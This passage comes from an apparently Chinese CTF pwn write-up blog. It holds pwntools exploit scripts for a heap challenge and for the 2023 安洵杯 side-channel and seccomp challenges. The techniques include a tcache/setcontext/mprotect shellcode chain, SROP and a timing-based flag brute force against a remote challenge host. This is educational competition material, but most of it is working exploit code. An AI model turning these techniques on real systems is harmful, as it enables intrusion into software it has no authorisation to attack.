A-&gt;bk = p</span></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step4 use ub to set bk-&gt;fd</span></span><br><span class="line">delete(<span class="number">6</span>) <span class="comment"># C1</span></span><br><span class="line">delete(<span class="number">3</span>) <span class="comment"># D=P-&gt;bk</span></span><br><span class="line"><span class="comment"># ub-D-C1    D-&gt;FD = C1</span></span><br><span class="line">delete(<span class="number">5</span>) <span class="comment"># merge D with H, preserve D-&gt;fd </span></span><br><span class="line">add(<span class="number">0x500</span>-<span class="number">8</span>, <span class="string">b&#x27;6&#x27;</span>*<span class="number">0x488</span> + p64(<span class="number">0x431</span>)) <span class="comment">#3 H1. bk-&gt;fd = p, partial write \x00</span></span><br><span class="line">add(<span class="number">0x3b0</span>) <span class="comment">#5 recovery</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step5 off by null</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x108</span>,<span class="number">0x100</span>*<span class="string">b&#x27;4&#x27;</span> + p64(<span class="number">0x550</span>))<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>) <span class="comment"># merge H1 with C0. trigger overlap C0,4,6</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">add(<span class="number">0x438</span>)<span class="comment">#3 put libc to chunk 4</span></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Note: &quot;</span>)</span><br><span class="line">libc.address = u64(p.recvline(<span class="literal">False</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - (<span class="number">0x7ffff7facce0</span>-<span class="number">0x7ffff7d93000</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x458</span>, <span class="number">0x438</span>*<span class="string">b&#x27;6&#x27;</span>+p64(<span class="number">0x111</span>)) <span class="comment"># fix size for chunk 4. 6 overlap 4</span></span><br><span class="line">delete(<span class="number">7</span>) <span class="comment"># tcache</span></span><br><span class="line">delete(<span class="number">4</span>) <span class="comment"># tcache</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Note: aaaaaaaa&quot;</span>)</span><br><span class="line">heap = u64(p.recvline(<span class="literal">False</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - (<span class="number">0x5555555605e0</span>- <span class="number">0x55555555f000</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">gadget=<span class="number">0x167230</span></span><br><span class="line"><span class="comment">#mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class="line"><span class="comment">#target=0x1234 #要写入的地址</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x458</span>,<span class="number">0x438</span>*<span class="string">b&#x27;6&#x27;</span>+p64(<span class="number">0x111</span>)+p64(((heap&gt;&gt;<span class="number">12</span>)+<span class="number">1</span>)^(libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]+<span class="number">0xc0</span>)))<span class="comment">#3 fd需要用heap处理</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">aim=heap+<span class="number">0x2c0</span></span><br><span class="line">setcontext=libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line">mprotect=libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">shellcode += shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>,aim,<span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,aim,<span class="number">0x100</span>)</span><br><span class="line">payload3 = asm(shellcode)</span><br><span class="line">payload1=flat(</span><br><span class="line">    &#123;<span class="number">0xa8</span>:mprotect,</span><br><span class="line">    <span class="number">0x68</span>:heap,</span><br><span class="line">    <span class="number">0x70</span>:<span class="number">0x1000</span>,</span><br><span class="line">    <span class="number">0x88</span>:<span class="number">7</span>,</span><br><span class="line">    <span class="number">0x8</span>:aim,</span><br><span class="line">        <span class="number">0x78</span>:heap+<span class="number">0x1000</span>,</span><br><span class="line">        <span class="number">0x20</span>:setcontext,</span><br><span class="line">        <span class="number">0xa0</span>:aim+<span class="number">0x148</span>,</span><br><span class="line">        <span class="number">0x108</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="number">0x110</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="number">0x138</span>:aim,</span><br><span class="line">        <span class="number">0x128</span>:libc.address+gadget,</span><br><span class="line">        <span class="number">0x118</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="number">0x120</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="number">0x140</span>:<span class="number">1</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    filler = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">)</span><br><span class="line">add(<span class="number">0x418</span>,payload1+p64(aim+<span class="number">0x150</span>)+payload3)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;111&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">source ./libcdbg/loadsym.py</span></span><br><span class="line"><span class="string">loadsym /home/aichch/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/.debug/.build-id/89/c3cb85f9e55046776471fed05ec441581d1969.debug</span></span><br><span class="line"><span class="string">b puts</span></span><br><span class="line"><span class="string">b printf</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">)</span><br><span class="line">pause()</span><br><span class="line">add(<span class="number">0x100</span>,p32(<span class="number">0xffffffff</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">20</span>+p64(libc.address+<span class="number">0x2163c0</span>)+p64(aim+<span class="number">0xf0</span>)[:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="flat的使用"><a href="#flat的使用" class="headerlink" title="flat的使用"></a>flat的使用</h2><p>flat是pwntools提供的数据平坦化函数,会自动转化小端序,不过要提前指定ARCH,否则默认4字节</p><p><strong>在构造setcontext,fake_io时可以提供便利</strong></p><p>以本题为例</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">flat(</span><br><span class="line">    &#123;   <span class="number">0xa8</span>:mprotect,</span><br><span class="line">        <span class="number">0x68</span>:heap,</span><br><span class="line">        <span class="number">0x70</span>:<span class="number">0x1000</span>,</span><br><span class="line">        <span class="number">0x88</span>:<span class="number">7</span>,</span><br><span class="line">        <span class="number">0x8</span>:aim,</span><br><span class="line">        <span class="number">0x78</span>:heap+<span class="number">0x1000</span>,</span><br><span class="line">        <span class="number">0x20</span>:setcontext,</span><br><span class="line">        <span class="number">0xa0</span>:aim+<span class="number">0x148</span>,</span><br><span class="line">        <span class="number">0x108</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="number">0x110</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="number">0x138</span>:aim,</span><br><span class="line">        <span class="number">0x128</span>:libc.address+gadget,</span><br><span class="line">        <span class="number">0x118</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="number">0x120</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="number">0x140</span>:<span class="number">1</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    filler = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>模板</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flat(</span><br><span class="line">    &#123;   </span><br><span class="line">        偏移(可不按顺序):值(自动小端序),</span><br><span class="line">    &#125;,</span><br><span class="line">    filler = <span class="string">&#x27;\x00&#x27;</span><span class="comment">#指定填充数据,不指定的话默认用cyclic生成填充</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>要对单个字节操作的话,也是一样的,不过要用b前缀<code>偏移:b&#39;x&#39;</code></p><h1 id="2023安洵杯-side-channel"><a href="#2023安洵杯-side-channel" class="headerlink" title="2023安洵杯-side-channel"></a>2023安洵杯-side-channel</h1><p>保护没开pie和canary</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_40136E</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">10</span>]; <span class="comment">// [rsp+6h] [rbp-2Ah] BYREF</span></span><br><span class="line">  _QWORD v2[<span class="number">4</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2[<span class="number">0</span>] = <span class="string">&#x27;onk u oD&#x27;</span>;</span><br><span class="line">  v2[<span class="number">1</span>] = <span class="string">&#x27;i tahw w&#x27;</span>;</span><br><span class="line">  v2[<span class="number">2</span>] = <span class="string">&#x27;\n?DIUS s&#x27;</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v1, <span class="string">&quot;easyhack\n&quot;</span>);</span><br><span class="line">  syscall(<span class="number">1LL</span>, <span class="number">1LL</span>, v1, <span class="number">9LL</span>);</span><br><span class="line">  syscall(<span class="number">0LL</span>, <span class="number">0LL</span>, &amp;unk_404060, <span class="number">4096LL</span>);</span><br><span class="line">  syscall(<span class="number">1LL</span>, <span class="number">1LL</span>, v2, <span class="number">24LL</span>);</span><br><span class="line">  sandbox();</span><br><span class="line">  syscall(<span class="number">0LL</span>, <span class="number">0LL</span>, v1, <span class="number">58LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一眼栈迁移rop,有沙盒</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0a</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x07</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x0000000a</span>  <span class="keyword">if</span> (A == mprotect) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x0000000f</span>  <span class="keyword">if</span> (A == rt_sigreturn) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000005a</span>  <span class="keyword">if</span> (A == chmod) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x000000e7</span>  <span class="keyword">if</span> (A != exit_group) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0012</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>只允许了这几个调用,可以看到没有write结合题目名字,猜测是要侧信道爆破</p><p>找了一下发现没有可利用的gadget</p><p>那么要控制参数只能靠rt_sigreturn系统调用了</p><p>但问题又来了如何触发这个系统调用,一个想法是read读取15个字符,但可以观察到主函数中的所用系统调用在使用完后都会<code>mov eax,0</code></p><p>那么显然不行,不过可以在程序中找到另一个syscall</p><p><code>0x40118A#syscall; nop; pop rbp; ret;</code></p><p>但还有一个问题,即如何完成read系统调用的布置,之前已经说过程序中并没有这样的gadget可以利用,但我们可以发现在原程序最后ret的时候,rdi,rsi,rdx三个寄存器依然保持着最后一个系统调用read的状态,那么直接syscall触发读取15个字节即可,之后再返回到syscall触发srop</p><p>然后执行mprotect修改bss段权限,执行open和read,并增加一段shellcode用于逐个字符爆破</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shellcode+=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax,&#123;&#125;</span></span><br><span class="line"><span class="string">mov bl,[rax]</span></span><br><span class="line"><span class="string">cmp bl,&#123;&#125;</span></span><br><span class="line"><span class="string">jz  0x404000</span></span><br><span class="line"><span class="string">jmp $-0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x404800</span>+pos,char)</span><br></pre></td></tr></table></figure><p>如果相等则会直接段错误,但如果不等则会无限循环,等待程序处理</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./chall&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path)</span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span>(script):</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">pos,char</span>):</span><br><span class="line">r()</span><br><span class="line">shellcode=shellcraft.chmod(<span class="string">&#x27;file&#x27;</span>,<span class="number">0o777</span>)</span><br><span class="line">shellcode+=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">shellcode+=shellcraft.read(<span class="number">3</span>,<span class="number">0x404800</span>,<span class="number">64</span>)</span><br><span class="line">shellcode+=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax,&#123;&#125;</span></span><br><span class="line"><span class="string">mov bl,[rax]</span></span><br><span class="line"><span class="string">cmp bl,&#123;&#125;</span></span><br><span class="line"><span class="string">jz  0x404000</span></span><br><span class="line"><span class="string">jmp $-0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x404800</span>+pos,char)</span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax=<span class="number">0xa</span></span><br><span class="line">sigframe.rdi=<span class="number">0x404000</span></span><br><span class="line">sigframe.rsi=<span class="number">0x1000</span></span><br><span class="line">sigframe.rdx=<span class="number">0x7</span></span><br><span class="line">sigframe.rip=syscall_ret</span><br><span class="line">sigframe.rsp=<span class="number">0x404460</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0x404460</span>)+p64(syscall_ret)+p64(<span class="number">0x404460</span>)+p64(syscall_ret)+<span class="built_in">bytes</span>(sigframe)</span><br><span class="line">payload=payload.ljust(<span class="number">0x400</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0x404460</span>)+p64(<span class="number">0x404470</span>)</span><br><span class="line">payload+=asm(shellcode,vma=<span class="number">0x400000</span>)<span class="comment">#pwntools asm带跳转的代码需要指定基址vma</span></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2a</span>+p64(<span class="number">0x404060</span>)+p64(lr)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">s(payload)</span><br><span class="line">sleep(<span class="number">0.01</span>)</span><br><span class="line">s(<span class="string">b&#x27;f&#x27;</span>*<span class="number">0xf</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">string=<span class="string">b&quot;0123456789abcdef&#125;&quot;</span>      </span><br><span class="line"></span><br><span class="line">lr=<span class="number">0x401446</span></span><br><span class="line">syscall_ret=<span class="number">0x40118A</span><span class="comment">#syscall; nop; pop rbp; ret;</span></span><br><span class="line">pos=<span class="number">0</span></span><br><span class="line">b=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">time=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;pos:&#123;&#125; time:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(pos,time))</span><br><span class="line"><span class="comment">#p=process(elf_path)</span></span><br><span class="line">p=remote(<span class="string">&#x27;47.108.206.43&#x27;</span>,<span class="number">26052</span>)</span><br><span class="line">pwn(pos,i)</span><br><span class="line">r()</span><br><span class="line">time+=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">chr</span>(i)==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">b=<span class="number">1</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p.recv(timeout = <span class="number">1</span>)</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">flag += <span class="built_in">chr</span>(i)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> b==<span class="number">1</span> :</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">pos+=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;success:&#x27;</span>+flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 23099102-a168-11ee-8c62-00163e0447d0</span></span><br></pre></td></tr></table></figure><h1 id="2023安洵杯-seccomp"><a href="#2023安洵杯-seccomp" class="headerlink" title="2023安洵杯-seccomp"></a>2023安洵杯-seccomp</h1><p><strong>标签:沙盒|rop</strong></p><p>上一题的弱化版,不过远程打不开flag是什么鬼</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./chall&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path)</span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span>(script):</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">        </span><br><span class="line">flag=<span class="number">0x404178</span>      </span><br><span class="line">lr=<span class="number">0x40136c</span></span><br><span class="line">syscall_ret=<span class="number">0x40118A</span><span class="comment">#syscall; nop; pop rbp; ret;</span></span><br><span class="line">p=process(elf_path)     </span><br><span class="line"><span class="comment">#p=remote(&#x27;47.108.206.43&#x27;,43800)</span></span><br><span class="line">pop_rax_ret=<span class="number">0x3f587</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x27c65</span></span><br><span class="line">pop_rdx_ret=<span class="number">0xfd68d</span></span><br><span class="line">pop_rsi_ret=<span class="number">0x29419</span></span><br><span class="line">syscall=<span class="number">0x853b2</span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">r()</span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax=<span class="number">1</span></span><br><span class="line">sigframe.rdi=<span class="number">0x1</span></span><br><span class="line">sigframe.rsi=<span class="number">0x403fd8</span></span><br><span class="line">sigframe.rdx=<span class="number">0x8</span></span><br><span class="line">sigframe.rip=syscall_ret</span><br><span class="line">sigframe.rsp=<span class="number">0x404460</span></span><br><span class="line"></span><br><span 